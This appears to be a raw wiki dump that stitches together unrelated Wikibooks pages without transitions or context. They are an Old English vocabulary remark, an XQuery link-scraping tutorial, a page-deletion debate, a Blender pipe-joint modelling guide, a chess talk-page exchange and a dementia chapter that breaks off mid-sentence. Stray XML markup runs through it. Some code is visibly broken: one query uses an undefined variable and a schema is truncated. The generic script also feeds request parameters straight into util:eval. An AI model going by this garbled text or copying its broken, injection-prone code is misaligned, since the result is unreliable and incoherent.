They didn't really have exact equivalents for short words for &quot;please&quot; and &quot;sorry&quot; in Old English, but &quot;lā&quot; could at a pinch be used in a request for &quot;please&quot; (see above). Also, one could use the interjection &quot;wālā&quot; or &quot;wālāwā&quot; to express sorrow or regret - approximately equivalent of &quot;sorry&quot;.

      <text xml:space="preserve">== Motivation ==
You want to gather the links on a blog page.

== Method ==
We use the '''doc()''' function to perform an HTTP GET on a remote web page.  If the page is a well formed XML file you can then extract all the unorder list items by adding a ul predicate to the doc function.



This script fetches the blog page and selects the urls in the link section, which reference other blog articles.  Each referenced article is fetched and the urls marked as external are selected. The result is returned as XML.

&lt;source lang=&quot;xml&quot;&gt;
declare namespace q = &quot;http://www.w3.org/1999/xhtml&quot;;

&lt;results&gt;
{
let $nav := doc(&quot;http://www.advocatehope.org/tech-tidbits/theory-of-the-web-as-one-big-database&quot;)//q:ul[@class=&quot;portletNavigationTree navTreeLevel0&quot;]
for $href in $nav//@href

for $links in $content//q:a[@title=&quot;external-link&quot;]
return
   &lt;link&gt;{ data($links/@href) }&lt;/link&gt;
}
&lt;/results&gt;

&lt;/source&gt;

== Version 2 ==

Dropping the intermediate variables allows the structure to be seen more clearly:

&lt;source lang=&quot;xml&quot;&gt;
declare namespace q = &quot;http://www.w3.org/1999/xhtml&quot;;

let $uri := &quot;http://www.advocatehope.org/tech-tidbits/theory-of-the-web-as-one-big-database&quot;
return
&lt;results&gt;
{
       for $page in doc($uri)//q:ul[@class=&quot;portletNavigationTree navTreeLevel0&quot;]//@href
       for $link  in doc($page)//q:div[@id=&quot;content&quot;]//q:a[@title=&quot;external-link&quot;]/@href
       return 
          &lt;link&gt;{data($link)}&lt;/link&gt;
}
&lt;/results&gt;
&lt;/source&gt;

[http://www.cems.uwe.ac.uk/xmlwiki/Gov/urlDiscover3.xq Execute]

== Repository Schemas ==

Daniel is proposing a standard for supporting the extraction of data such as this from a site. Such a schema would define a view of a set of documents sufficient to allow the extraction above to be based on the schema.

We can go some way towards this with a view schema represented as an ER model, with added implementation-dependent paths. 


&lt;source lang=&quot;xml&quot;&gt;
&lt;model  name=&quot;blog-links&quot;&gt;
    &lt;type name=&quot;url&quot; datatype=&quot;string&quot;/&gt;
    &lt;entity name=&quot;page&quot;  &gt;
        &lt;attribute name=&quot;inner&quot;  max=&quot;N&quot;   path=&quot;//q:ul[@class='portletNavigationTree navTreeLevel0']//@href&quot;  type=&quot;page&quot;/&gt;
        &lt;attribute name=&quot;external&quot; max=&quot;N&quot;  path=&quot;//q:div[@id='content']//q:a[@title='external-link']/@href&quot;  type=&quot;url&quot;/&gt;
     &lt;/entity&gt;
&lt;/model&gt;
&lt;/source&gt;

This schema can then be used by a generic script link gathering script:

&lt;source lang=&quot;xml&quot;&gt;
let $start := request:get-parameter(&quot;page&quot;,())
let $view := request:get-parameter(&quot;view&quot;,())
let $schema := doc($view)
let $inner := $schema//entity[@name='page']/attribute[@name='inner']/@path 
let $external := $schema//entity[@name='page']/attribute[@name='external']/@path  
return
&lt;results&gt;
{
       for $page in util:eval(concat('doc($start)',$inner))
       for $link in util:eval(concat('doc($page)',$external))
       return      
         &lt;link&gt;{string($link)}&lt;/link&gt;
}
&lt;/results&gt;

&lt;/source&gt;

This script now performs the task of link gathering on any site whose page structure can be defined in terms of the schema with appropriate paths.

[http://www.cems.uwe.ac.uk/xmlwiki/Gov/urlDiscover5.xq?page=http://www.advocatehope.org/tech-tidbits/theory-of-the-web-as-one-big-database&amp;view=/db/Wiki/Gov/blog.xml Execute]

== Relative and absolute URIs ==

The previous version works only if the URIs are absolute.  A little more work is needed if not:

&lt;source lang=&quot;xml&quot;&gt;
declare namespace q = &quot;http://www.w3.org/1999/xhtml&quot;;

declare variable $start := request:get-parameter(&quot;page&quot;,());
declare variable $view := request:get-parameter(&quot;view&quot;,());
declare variable $schema := doc($view);
declare variable $base :=  substring-before($start,local:local-uri($start));

declare function local:local-uri($uri) {
  if (contains($uri,&quot;/&quot;))
  then local:local-uri(substring-after($uri,&quot;/&quot;))
  else $uri
};

declare function local:absolute-uri($url) {
   if (starts-with($url,&quot;http://&quot;))
   then $url
   else concat($base,$url)
};

let $inner := $schema//entity[@name='page']/attribute[@name='inner']/@path 
let $external := $schema//entity[@name='page']/attribute[@name='external']/@path  

let $starturi := local:absolute-uri($start)
return
&lt;results&gt;

{
       for $page in util:eval(concat('doc($starturi)',$inner))
       let $pageuri := local:absolute-uri($page)
       for $link in util:eval(concat('doc($pageuri)',$external))
       return      
         &lt;link&gt;{string($link)}&lt;/link&gt;
}
&lt;/results&gt;


&lt;/source&gt;

So with a different schema - same model, different paths:

&lt;source lang=&quot;xml&quot;&gt;
&lt;model name=&quot;site-links&quot;&gt;
    &lt;type name=&quot;url&quot; datatype=&quot;string&quot;/&gt;
    &lt;entity name=&quot;page&quot;  &gt;
         &lt;attribute name=&quot;inner&quot; max=&quot;N&quot; path=&quot;//div[@class='nav']//a/@href&quot; type=&quot;page&quot;/&gt;
        &lt;attribute name=&quot;external&quot; max=&quot;N&quot; path=&quot;//div[@class='content']//a/@href&quot; type=&quot;url&quot;/&gt;
    &lt;/entity&gt;
&lt;/model&gt;
&lt;/source&gt;

which is a view schema of this   [http://www.cems.uwe.ac.uk/xmlwiki/Gov/site/test1.html test site]

[http://www.cems.uwe.ac.uk/xmlwiki/Gov/urlDiscover6.xq?page=http://www.cems.uwe.ac.uk/xmlwiki/Gov/site/test1.html&amp;view=/db/Wiki/Gov/site.xml  Execute]


== Virtual Paths ==

The navigation path is still hard-coded in the script.  We would like to write path expressions where the steps are defined in the schema.  This path would then be interpreted in the context of the schema.  

=== View Schema ===

In this example, the test site has been expanded to include a separate index page and some additional components in the view:
&lt;source lang=&quot;xml&quot;&gt;
&lt;model name=&quot;site-links&quot;&gt;
    &lt;entity name=&quot;externalPage&quot;&gt;
        &lt;attribute name=&quot;title&quot; path=&quot;/head/title&quot;/&gt;
    &lt;/entity&gt;
    &lt;entity name=&quot;index&quot;&gt;
        &lt;attribute name=&quot;link&quot; max=&quot;N&quot; path=&quot;//div[@class='index']//a/@href&quot; type=&quot;page&quot;/&gt;
     &lt;/entity&gt;
     &lt;entity name=&quot;page&quot;&gt;
        &lt;attribute name=&quot;title&quot; path=&quot;//head/title&quot;/&gt;
        &lt;attribute name=&quot;inner&quot; max=&quot;N&quot; path=&quot;//div[@class='nav']//a/@href&quot; type=&quot;page&quot;/&gt;

=== Path language ===

This prototype uses a simple path language.The step -&gt; dereferences a relative or absolute URL.  Where a step is recognised as an attribute of the current entity, the associated path expression is used, otherwise the step is executed as XPath.  The first step identifies the (entity) type of the initial document. 

For example:
==== index/link/-&gt;/title ====
List the titles of the pages in the index. 

&lt;source lang=&quot;xml&quot;&gt;

import module namespace vp =&quot;http://www.cems.uwe.ac.uk/xmlwiki/vp&quot; at &quot;../Gov/vp.xqm&quot;;

let $uri := &quot;http://www.cems.uwe.ac.uk/xmlwiki/Gov/site/index.html&quot;
let $schema := &quot;/db/Wiki/Gov/site3.xml&quot;
return
  &lt;result&gt;
  {vp:process-path($uri,&quot;index/link/-&gt;/title&quot;,$schema) }
  &lt;/result&gt;

&lt;/source&gt;

[[Special:WhatLinksHere/Wikibooks:Off-wiki_chat|Unused]] and redundant with [[Wikibooks:Contact us]]. [[User:Swift|Swift]] ([[User talk:Swift|talk]]) 10:13, 29 January 2009 (UTC)

: [[Image:Symbol delete vote.svg|15px]] '''Delete''' --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 10:13, 29 January 2009 (UTC)

: [[Image:Symbol keep vote.svg|15px]] '''Keep''' - It is not redundant, as is informs people on the need of keeping a record of discussions on project, not where parallel discussion or talks can take place, like [[Wikibooks:Contact us]]. It also provides a information against group think, alliance forming and overall problems that can be exacerbate the dilution of how consensus is applied on Wikibooks. I don't see this information replicated in any other informational, policy or guideline text, this probably isn't the best place but the content it holds is useful...  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 18:43, 29 January 2009 (UTC)
:: I've [http://en.wikibooks.org/w/index.php?title=Wikibooks:Contact_us&amp;diff=1400249&amp;oldid=1388949 added] a mention that IRC conversations are not archived and a suggestion that discussions be left on-wiki for the benefit of others. Would this be an acceptable compromise?
:: I see where you're going with your wish to keep in a &quot;group think&quot;/&quot;alliance forming&quot;/&quot;consensus forming&quot;-clause. You have previously made [http://en.wikibooks.org/w/index.php?title=Wikibooks:Reading_room/Administrative_Assistance&amp;diff=1383261&amp;oldid=1383221 allegations] that others have set you up and have had repeated Don Quixote-escue battles with the community. This page, however, has no such language and was furthermore created by an administrator deep in the heart of this nest of conspirators.
:: I agree, however, that an essay on practices that encourage an inclusive community and discourages [[w:clique]]s could be useful. Feel free to start one. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 02:52, 8 February 2009 (UTC)
:::Whatever you like, I have become very weary of unexplained and unexpected coincidences especially if fallowed by overblown reactions or 180 degrees changes of intentions.
:::We should provide the info that makes it clear that off wiki discussions about a non present party, his actions and consequences, aren't productive, useful and can even be amoral since said third party can't defend his opinion in equal grounds (this is valid even in any second channel, not only IRC), nor a valid log to the discussion, and yes it promotes building of groups, clique (whatever name you see best, I'm not establishing that the root cause is bad intentions), just because once something is said and no due process is done to examine those allegations, it becomes a fact in the minds of those that shared the info, sadly this is true and a known effect it is used by the media and marketing as a tool to form and shape actions. It is also recognized as bad practice in society, as talking one someone's back. 
:::Also it is especially interesting to me that the creator of the text is WK and I call your attention to the timeline. It seems related to the fact that a situation occurred on those specific lines. Not the first, since you are working on the fork policy something on those lines happened there also (even if we have logs of discussions on project) the fact is that a unlawful forced merge was allowed to proceed without any real info been retained on project besides my objection to the ex-admin that implemented it...
:::Using other channels to establish a majority or as a way to use peer pressure, so to establish acceptable behavior on project should be frown upon. I have called attention in the past to how easy it is to a group (coordinated or not) to control and mold the future of the project, just because how the decission process is being used, it discards the block of the decission as a possible outcome, that is, put simply, minority views aren't really recognized, liked or taken as something that should be considered or promoted. This is especially true if there is only one party opposing (most project decisions are made by 4 to 10 users), if someone disagrees to something he/she is a troll a crackpot or is &quot;disturbing&quot; the community, examples of this stance by the active majority are numerous. From the top of my head the issues of games guides, removing admin flags, book names, fork, user blocks, arbitration processes, all this processes/discussions or voices opposing the adopted formula were ignored or discarded, or overly stated as closed issues, alienating some Wikibookians in the process. If we are really attempting to get people to participate, fallow consensus as the decission process we should address and respect other peoples ideas, even if we don't agree with them, for the projects benefit they should be at least be considered.
:::I have yet to see any discussion process on Wikibooks (even the VfD) were a Wikibookian could be attributed bad intentions.
:::If you really thing removing this text form its present location is a benefit on a structural level please consider my vote as changed and I request that the page be moved to my userspace in place of losing it (due to historical relevance at least to me), since it is GFDL and has no objectionable content I don't see it as problematic, put it here [[User talk:Panic2k4/CrossTalk]] I'll try to build on it an '''Essay on using back channels to promote hegemony '''.   --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 05:33, 8 February 2009 (UTC)

I haven't had time to go through the pages for this nomination, but I suspect that the same is true. You can help by checking whether there is any content on this page which is not covered on the others which Mr. Z-man linked to in the nomination. Thanks, and happy editing! --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 01:29, 15 February 2009 (UTC)

How to model pipe joints. 

== T joint ==
Start in top view, and delete the cube.

[[Image:Blender3D Roehrenabzweig.png|right|150px|'''Figure 1:''' Modeling a simple T joint.]]

* Add a cylinder object (''Add-&gt;Mesh-&gt;Cylinder'')
* 16 Vertices, No Caps, Depth 4 (For recent versions of Blender create the cylinder then press F6 to get these options)
* Switch to front view (''View-&gt;Front or NUM1''). 
The X axis now points to the right. We will work along the X axis from now on. 

* Change to Edit mode (TAB).
* Create a Loop Cut in the middle of the cylinder ('''Ctrl-R''').
Make sure that the 3D cursor is placed in the middle of the cylinder.





* Switch to right view ('''NUM3''')
* Box select ('''BKEY''') the 7 vertices at the front (Tip: tick the ''Occlude background geometry'' button)









* Switch back to front view ('''NUM1''')
* ''Pivot -&gt; 3D Cursor'' ('''.KEY''')
* Scale with the X axis ('''S-X'''), about 1.4142 (square root of 2).
'''Noob Note''': If your vertices are not symmetrical after you scale them, then you may have one of two problems. Make sure your cursor is in the middle of the cylinder (AKey to select all, ShiftS, Cursor to Selected). Also make sure that you have selected the proper 7 vertices. The center vertex should lie directly along the X axis, and there should be 3 vertices on either side of the X axis.









* Rip the mesh with '''V'''.
* There will be 7 overlapping vertex pairs: 7 vertices linked to the top half of the tube, and 7 vertices linked to the bottom half of the tube.
* Either the upper vertices or the lower vertices should be selected.  Depending on which set of vertices is now selected you will need to rotate by -45 (upper) or +45 (lower).
* Once you have rotated the first set, deselect all ('''AKEY'''), then box select the other half of the opening
* Rotate the selected vertices by +/- 45 degrees.  The pipe should now be straight again thanks to the rotations.

'''Noob Note''': When you rotate the vertices, make sure that you are rotating them along the Y axis (RKey, YKey).





* Box select the vertices of the gap and extrude &quot;edges&quot; along the X axis. 













* ''Pivot -&gt; Median Point'' ('''CTRL+,KEY''')
* To flatten the front: scale at the X axis by factor 0. ('''S-X''', '''0''').












* Use the ''Subsurf'' modifier in combination with ''Set Smooth'', ''LoopCuts'', and ''Crease'' to get a nice transition.

== 6 cylinder joint ==
[[Image:Blender3D 6TubesJoint.png|right|200px|'''Figure 2:''' 6 cylinder joint]]
Be in Object mode (have nothing else selected)

Add a cube.

Switch to Edit mode

Select all, then Subdivide the cube once ('''W''', '''1''') ('''1''').

Select the 12 vertices in the middle of the cube's edges.

Scale by factor 1.4142 (press '''S''' key and type in the factor with the keypad)  ('''2''').


Select all vertices, and Extrude &quot;Individual Faces&quot; (This can be done either on the Tool Shelf under &quot;Add&quot; or you can type '''Space''' and search for Extrude Individual Faces and Move.) ('''3''').

Select all vertices, and ''Remove Doubles''.




Select the center vertex of each tube, and delete them to open the ends


Select the original vertices in the middle of the object and delete them ('''5''').



Clean your mesh as described above.

== 3 cylinder joint ==
[[Image:Blender3D 3TubesJoint.png|right|201px|'''Figure 3:''' 3 cylinder joint]]
This is very similar to above, only the selection for scaling is different.
* Select the middle vertices at the edges where the cylinders shall come from. Additionally select the middle vertices at the faces that shall be kept free. You have to select 12+3=15 vertices.
* Scale your selection by 1.4142.
* Select the faces that shall be extruded.
* ''Extrude-&gt;Individual Faces'' ('''5''')
* Select all, then ''Remove Doubles''.
* Delete the inner vertices ('''6''', '''7''').
* Select 3 vertices (which were middle of faces that were kept free) and 1 corner vertex in middle of the free faces ('''8''').
* Make sure your 3D cursor is at the origin (and that you added the cube at the origin)
and switch to 3D Cursor Pivot ('''.KEY''' in v2.49b), then scale ('''SKEY'''), and type in 0.7071 (inverse of square root of 2, or Sin(45 degrees) or Cos(45 degrees)) and '''ENTER'''
('''9''').
* Make sure you switch back to Median Point Pivot ('''SHIFT'''+''',KEY''') to straighten out pipe ends ('''10''').

Clean your mesh as described above.


If your joint looks odd, it might be because of some edges in the mesh. Delete those by selecting it and delete ('''XKEY''') edges (not vertices).

== T joint with smaller diameter ==
[[Image:Blender3D LargeSmallTube.png|framed|'''Figure 4a:''' Basic structure for a T joint with a smaller diameter]]
[[Image:Blender3D LargeSmallTubeResult.png|framed|'''Figure 4b:''' The result]]
We're going to create a structure like in '''Fig.&amp;nbsp;4a''' and extrude the inner circle. To do that we place a circle with ''Retopo'' ([http://wiki.blender.org/index.php/Doc:Manual/Modelling/Meshes/Remaking_the_Tolopogy Manual]) on the cylinder and join both objects afterwards.

* ''Add-&gt;Mesh-&gt;Cylinder''
** 8 vertices (of course you can use more vertices if you like)
** ''No Caps''
** ''Depth 4''
** '''Noob note:''' ''More vertices in your cylinder will mean more intuitive work and figuring [more loop cuts, face making, etc.] later on when retopo-ing.  I suggest following the tutorial first, then try to do a more advanced model with more faces / vertices when you understand the tool.  If you have trouble [as I did] getting really nice geometry, do [http://video.google.com/videosearch?sourceid=navclient&amp;rlz=1T4GGLR_enUS262US264&amp;q=blender%20retopo%20tutorial&amp;um=1&amp;ie=UTF-8&amp;sa=N&amp;hl=en&amp;tab=wv# a search for some tutorial videos].  There are many really helpful ones.''
* ''Add-&gt;Mesh-&gt;Circle'' ('''Noob note:''' ''To make sure you create these as separate objects, be in Object Mode (not Edit Mode).'')
** 8 vertices
** ''No fill''
* Rotate the circle by 90° at the Y axis ('''R'''-&gt;'''Y'''-&gt;'''90''').
* Move the circle in front of the cylinder('''G'''-&gt;'''X'''-&gt;'''2''').
* Switch to side view ('''Num-3''').
* Scale the circle to the diameter of the smaller cylinder. 

('''Noob note:''' ''I felt this was a little unclear. What the author means is, scale the circle down until it is the size of the diameter of the smaller cylinder you are going to create from it later by extrusion.  You would be wise to scale it so it fits (straight backwards from view) inside the two closest faces of the cylinder as per '''Fig. 4a''' if you wish to follow the tutorial. '')

* Switch to edit mode, select all vertices of the circle.

('''Noob note:''' ''To recap: you should be in edit mode for the circle, with the all of it selected, with the cylinder object directly behind it in from your viewpoint in orthographic mode.)''
Make sure that you don't work in ''Wireframe'' view.

* Click on ''Retopo-&gt;Retopo All'' in the ''Mesh'' panel of the ''Editing'' buttons.

('''Noob note:''' ''What Retopo does [in this case]; is project the selected topography of an object in edit mode directly backwards from your selected view point onto the topography of another [seperate] object.  So you must be lined up view-wise for this to work. I've also found sometimes I must press the '''Enter key''' for the'' '''Retopo All''' '' to take effect even if I've selected it with the '''LMB''' ''.)

If the vertices of the circle are not adjacent to the cylinder but have jumped to wrong places undo the last step ('''Ctrl-Z'''), deselect and reselect all vertices and try again. This does help (strangely). ''Retopo'' works with limited accuracy, if the vertices don't fit perfectly you have to move them by hand.

* Change to object mode, select additionally the cylinder and join both objects ('''Ctrl-J''').
Now you work best in ''Wireframe'' view.
* Add three loop cuts ('''Ctrl-R'''-&gt;'''3''')
* Delete the middle vertex.
* Connect the free vertices ('''F''').
* Select the circle.
* Extrude and clean up.


'''Noob Note -:''' I couldn't follow this last pipe tutorial with blender 2.6, so I made a video on how to do it once i worked it out.
Thought i would put link to it in case anyone else needed help.  (hope that's OK )

==On evaluating 3. ...b6 as = ==
 
Won't 3. ...b6 allow a simple 4. e4. ?

Black can always play b6 later, such as in Fischer's System &quot;4. ... b6&quot;, the response to the Rubenstein variation. {{unsigned|93.95.81.1|02:06, 24 February 2011‎}}

: Rubinstein variation is part of the [[Chess Opening Theory/1. e4/1...e6/2. d4/2...d5/3. Nc3|French Defense]], which is a completely different family of openings.  In case of doing 4.e4, I see no reason not to capture the undefended pawn, especially when it causes white to do reactionary moves and places the knight in the center of the board (where it has the potential to fork).   &lt;br/&gt; Also, the [[Chess Opening Theory/1. d4/1...Nf6/2. c4/2...e6/3. Nf3/3...b6|Queen's Indian Defense]] already has a slightly better option of 4. e3 that doesn't give such a vulnerability. --[[User:Sigma 7|Sigma 7]] ([[User talk:Sigma 7|discuss]] • [[Special:Contributions/Sigma 7|contribs]]) 17:32, 3 January 2013 (UTC)</text>

== Dementia, Delirium, and Psychiatric Symptoms Secondary to General Medical Conditions ==
;Dementia, Delirium, and Psychiatric Symptoms

[[Category:Collections|Dementia, Delirium, and Psychiatric Symptoms]]
'''Introduction'''


	In this chapter, we consider three related types of medical psychiatric disorders, usually accompanied by behavioral abnormalities: ''dementia,'' ''delirium'', and neurobehavioral disorders'' due to general medical conditions''. The common factor in these admittedly diverse conditions is a pathological alteration of brain structure and/or function, leading to abnormalities in cognition, affect, perception, or behavior. In the older U.S. literature, the term &quot;organic brain syndrome&quot; was often used to distinguish these conditions from so-called ''functional'' psychiatric disorders, such as schizophrenia or major depression. Indeed, the &quot;organic&quot; designation is retained in the ICD-10 classification (ICD-10, 1993). 
In our view, however, the terms &quot;organic&quot; and &quot;functional&quot; suggest a false dichotomy. As we have learned more about the pathophysiology of common psychiatric disorders, such as schizophrenia or depression, the conceptual demarcation between these conditions and those discussed in the present chapter has become less distinct. For example, decreased metabolic function in frontal brain regions may be observed in both dementia and major depression, though the course and prognosis of these conditions differ markedly. Similarly, abnormalities in the cholinergic system may be present in both Alzheimer\’s Disease and schizophrenia (Raedler et al, 2007), notwithstanding the many differences between these disorders. Advanced neuroimaging techniques, genetic studies, as well as abnormal neurobiologic function  in several animal models suggest receptor and circuit disturbances, even in the absence of traditional neurological abnormalities such as stroke or tumor. For all these reasons, we generally avoid the term &quot;organic&quot; in this chapter, but ''do'' use it when a particular study, author, or context justifies it. 
The term &quot;cognitive disorder&quot; is often used to encompass delirium, dementia, and related conditions. This term appropriately emphasizes that a ''disturbance in memory, language, or attention'' is usually a cardinal feature of these disorders. However, the term &quot;cognitive disorder&quot; is far from ideal, since other aspects of consciousness, mood, and behavior may be strikingly abnormal in delirium, dementia, and related conditions. For example, the patient with frontal lobe dementia may show marked behavioral disinhibition, while the patient with Parkinson\’s Disease and dementia may show signs of major depression.  
The disorders discussed in this chapter are seen in many health-care environments, and are by no means confined to psychiatric settings. For example, between 11-16% of inpatients on general medical units may experience delirium at some time during their admission (Levkoff et al, 1991). In skilled nursing facilities, at least 14 % of residents may suffer from some form of dementia (Sabbagh et al, 2003), with some studies finding that more than 50% of nursing home beds are occupied by patients with Alzheimer\’s Disease (Sadock &amp; Sadock, 2007, p. 329). And while there are no reliable prevalence statistics for psychiatric symptoms due to general medical conditions (GMCs), these disorders appear to be common in emergency department (ED) settings, where they often go undiagnosed. Indeed, in one study ( Tintinalli et al, 1994) the chart was documented &quot;medically clear&quot; in 80% of ED patients in whom medical disease should have been identified.
Finally, a word about diagnostic systems: in most respects, there are more similarities than differences between the DSM-IV and ICD-10 classifications of the disorders discussed in this chapter; indeed, our discussion emphasizes ''common features'' rather than the specific criteria set forth in these two systems. However, when significant differences are clinically relevant, we will note them.

'''DEMENTIA'''

'''Phenomenology (Characteristic Features of the Dementias)'''

'''	'''Dementia may be broadly defined as ''a progressive, acquired impairment of cognitive function sufficient to cause functional decline, and occurring in a relatively normal (&quot;clear&quot;) level of consciousness''; i.e., in the absence of delirium (Sadock &amp; Sadock, 2007; Apostolova &amp; Cummings, 2008). We shall see, however, that there are some notable exceptions to this generalization, and that it is often more useful to define specific types of dementia. ''Global impairment of the intellect'' is a cardinal feature of dementia. More specifically, most dementia syndromes demonstrating the following neurobehavioral deficits:   
* Memory impairment (either impaired ability to learn new information, or to recall previous information), usually evident for at least 6 months
* Deterioration in judgment, planning, and organizing (e.g., impaired shopping, cooking, handling money)
* Absence of &quot;clouding of consciousness&quot; for a period long enough to demonstrate decline in memory
* Decline in emotional control or motivation; or a change in social behavior (e.g., emotional lability, irritability, apathy, loss of social graces). DSM-IV specifically emphasizes a significant impairment in social and/or occupational functioning, as a result of the aforementioned deficits
* DSM-IV emphasizes one or more of the following: ''aphasia'' (language disturbance), ''apraxia ''(impaired ability to carry out motor activity despite intact motor function), ''agnosia'' (failure to recognize objects despite normal sensory function); and ''disturbance in executive functioning'' (planning, organizing, sequencing, abstracting). In partial contrast, ICD-10 regards these as essentially ''supportive'' findings for diagnosis of dementia. 

The epidemiology, clinical features, and pathogenesis of dementia vary considerably, depending on the subtype; for example, ''dementia of the Alzheimer type (DAT), Vascular Dementia, Lewy Body Dementia'', etc. Nevertheless, it is common to encounter elderly patients in the clinical or nursing home setting who carry only the syndromic diagnosis of &quot;dementia&quot; (Jacobson et al, 2007). It is worth noting that not all definitions of dementia require memory impairment as a diagnostic criterion; indeed, some patients with ''frontotemporal dementia'' (FTD) may be severely affected with ''behavioral disturbances'' before memory impairment is prominent (Jacobson et al, 2007).  Dementia must be distinguished from so-called ''mild cognitive impairment'' (MCI), which appears to represent an intermediate stage between normal aging and dementia (Apostolova &amp; Cummings, 2008). Unlike those with dementia, MCI patients do ''not'' show significant impairment in activities of daily living. 

''Epidemiology of the Dementias''

	Dementia of some type may afflict as many as 28 million individuals world-wide, with direct costs for care estimated at 156 billion U.S. dollars (Wimo et al, 2006). Of the total number of demented individuals worldwide, the largest proportion (5.2 million, or 18.5%) lives in China (Wimo et al, 2006). If one groups all dementias together, the estimated prevalence is about 5% in the general population older than age 65, and 30% in those older than age 85 (Sadock and Sadock, 2007 p. 329). Findings on racial variations in dementia are somewhat equivocal, but most studies have reported higher frequencies of dementia among nonwhite persons (Husaini et al, 2003).  Disproportionately high rates of dementia among African-Americans may be due, in part, to a higher prevalence of both hypertension and stroke among elderly African-Americans. Women generally have higher rates of dementia than men, largely because women live longer (Husaini et al, 2003). However, vascular dementia appears to be more common in men. 
Dementia of the Alzheimer\’s Type (DAT, &quot;Alzheimer\’s Disease&quot;) is by far the most common type of dementia, making up roughly 35%-60% of cases worldwide (Mendez &amp; Cummings, 2003; Sadock and Sadock, 2007, p. 329). The wide range of these figures is due in part to some controversy over the classification of ''Lewy Body Dementia'' (LBD); i.e., if LBD is considered a variant form of DAT (Sadock and Sadock, 2007, p. 329), the prevalence figure for DAT tends toward the higher end of the range. Many geriatric psychiatrists consider LBD to be the second most prevalent dementia subtype (&quot;tied&quot; with mixed vascular dementia/DAT), with a prevalence of about 15%. About 10% of dementias are said to be represent pure vascular dementia, while another 5% represent fronto-temporal dementia (Mendez and Cummings, 2003; Jacobson et al, 2007). Some data suggest that the DAT/vascular dementia ratio is comparatively higher in South America and lower in Asia (Lopes &amp; Bottino, 2002), though the reasons for these trends are not clear. Miscellaneous causes of dementia—including cases due to Huntington\’s Disease, Creutzfeld-Jakob Disease,  Parkinson\’s, HIV infection, and other conditions—probably constitute fewer than 5% of the total. 
That said, there is a paucity of ''autopsy-based studies'' of dementia prevalence, which would presumably be more accurate than those based on clinical diagnosis alone. In one of the few such studies (Fu et al, 2004),  202 demented patients underwent brain-only autopsies, and the following types of dementia were found: 129 (63.8%) cases showed changes of severe Alzheimer disease; 21 (10.4%) showed combined neuropathologic abnormalities (Alzheimer disease plus another type of lesion, such as significant ischemic infarcts or diffuse Lewy body disease), 12 (5.9%) cases of relatively pure ischemic vascular dementia, 13 (6.4%) cases of diffuse Lewy body disease, and 8 (4.0%) cases of frontotemporal dementia. The remaining 19 (9.4%) patients showed various neuropathologic diagnoses, including normal pressure hydrocephalus and progressive supranuclear palsy. Notably, the authors concluded that, had these diagnoses been known ante mortem, the clinical care of the patients might well have been different (Fu et al, 2004). 

''Clinical Features of Dementia Subtypes''

* Cortical vs. subcortical distinction

The older literature on dementia often describes two broad subtypes that encompass many of the more pathologically-specific types of dementia. Though the distinction between so-called ''cortical'' and ''subcortical ''dementias is controversial, it remains a useful conceptual tool in preparation for understanding more specific forms of dementia (Turner et al, 2002). Although there is no specific neuropsychological pattern in subcortical dementia, this group of disorders is generally characterized by ''cognitive slowness, concomitant motor abnormalities,'' and a relatively ''low frequency of aphasias and apraxias'', compared with Alzheimer-type dementia (Turner et al, 2002).  The principal differences between cortical and subcortical dementias are summarized in Table 1. It is important to note that some conditions—such as multiple small strokes and certain toxic-metabolic disorders—produce symptoms of ''both'' cortical and subcortical dysfunction (Cummings, 1985). Furthermore, the cortical/subcortical distinction has become less useful as our understanding of specific dementia syndromes has increased (Turner et al, 2002). Indeed, Lerner and Riley (2008) have pointed out that the dementias of Huntington\’s and Parkinson\’s Disease—two putative &quot;subcortical&quot; dementias—are as different from each other as they are from Alzheimer\’s Disease, the classic &quot;cortical&quot; dementia. Furthermore, these authors note that &quot;…the pathological basis for dementia in (Parkinson\’s Disease) is now known to lie in the cerebral cortex…effectively rendering its designation as a &quot;subcortical&quot; dementia untenable.&quot; (p. 908). In short—though useful as a rough, first-pass approximation—the designations &quot;cortical&quot; and &quot;subcortical&quot; are likely to be modified with more specific pathoanatomical and descriptive assessments.

* Dementia of the Alzheimer Type (DAT)

''Case vignette: Mrs. A, a 91-year-old widowed Caucasian woman in good general health, was seen by her family physician for complaints of &quot;forgetting things a lot lately.&quot; Mrs. A\’s daughter, who often helped her mother with household chores, had noticed a change in her mother\’s thinking and behavior over the past two years. &quot;Mom used to be sharp as a tack and never forgot a thing,&quot; she reported. &quot;Nowadays, she has trouble remembering even simple things, like turning off the stove, or in what room she keeps all her bills and papers. The other day, I found that she had left the bath running for over an hour, and it flooded the whole upstairs. Sometimes, Mom confuses me with her sister, who died over twenty years ago. When I try to explain who I am, Mom sometimes gets kind of irritable with me, and says I\’m trying to confuse her.&quot; There was no history suggestive of stroke, sudden change in mental status, or loss of gross motor or sensory function. On mental status exam, the patient was pleasant, socially appropriate, and in no acute distress. She was oriented to the year, but not to month, day, or date. She recalled only one word item after three minutes. She could not remember the name of the two most recent U.S. Presidents, but was able to speak knowledgeably about the Presidents during the U.S. Great Depression (1929-1941). When asked to name three objects on the physician\’s desk (stapler, paper clip, and calendar), she named them as &quot;stapler, paper grip, and day book.&quot; A provisional diagnosis of &quot;dementia, probably of the Alzheimer\’s type&quot; was made by the physician. ''

	As the vignette suggests, DAT (Alzheimer\’s Disease) is characterized most saliently by a gradual onset and progression of cognitive decline. Frank signs and symptoms of DAT often follow a prodromal stage of mild memory impairment that does not markedly interfere with activities of daily living'''. '''With disease progression, the patient shows more global cognitive decline, with disturbance in language, visuospatial skills, executive functioning, and social interaction. Typical of progressive DAT is a ''transcortical sensory aphasia, ''in which the patient shows fluent word output and preserved ability to repeat spoken language, but impaired speech comprehension (Apostolova &amp; Cummings, 2008). '' ''With further progression of DAT, the patient shows impaired judgment and reduced ability to carry out activities of daily living. Disturbances in sleep-wake cycle or appetite often ensue. Although depression is often considered a hallmark of ''subcortical'' dementias, it is actually a common feature in DAT. However, only about half of patients with depression/dysphoria in DAT meet full criteria for major depression (Apostolova &amp; Cummings, 2008). Irritability, agitation (including pacing, &quot;fidgeting&quot; or verbal outbursts) and psychotic features (such as visual hallucinations and delusions of having been robbed) are also common in DAT, and impose great emotional burdens on the patient\’s family and caregivers. Patients with ''early-onset DAT'' (see under Pathogenesis) may show atypical features, such as prominent aphasia, myoclonic jerks, emotional lability, or obsessive-compulsive symptoms (Apostolova 